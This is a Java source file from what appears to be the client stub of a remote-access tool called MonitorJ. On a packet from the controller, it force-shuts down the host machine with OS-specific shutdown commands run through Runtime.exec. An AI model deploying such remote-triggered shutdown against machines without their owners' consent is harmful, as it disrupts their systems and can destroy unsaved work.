package me.jershdervis.monitorj.stub.client.tasks;

import me.jershdervis.monitorj.stub.client.BaseClient;
import me.jershdervis.monitorj.stub.client.PacketTask;
import me.jershdervis.monitorj.stub.client.Packets;
import me.jershdervis.monitorj.stub.util.OSCheck;

import java.io.IOException;

/**
 * Created by Josh on 4/07/2015.
 * TODO: Needs to be tested on Mac and Linux
 */
public class ShutdownClientSystemTask extends PacketTask {

    public ShutdownClientSystemTask() {
        super(Packets.SHUTDOWN_CLIENT_SYSTEM.getPacketID());
    }

    @Override
    public void run(BaseClient client) throws IOException {
        String shutdownCommand = null;
        OSCheck.OSType osType = OSCheck.getOperatingSystemType();
        switch (osType) {
            case Windows:
                shutdownCommand = "shutdown -s -f";
                break;
            case MacOS:
                shutdownCommand = "shutdown -h now";
                break;
            case Linux:
                shutdownCommand = "shutdown -h now";
                break;
        }
        if(shutdownCommand != null)
            Runtime.getRuntime().exec(shutdownCommand);
    }
}
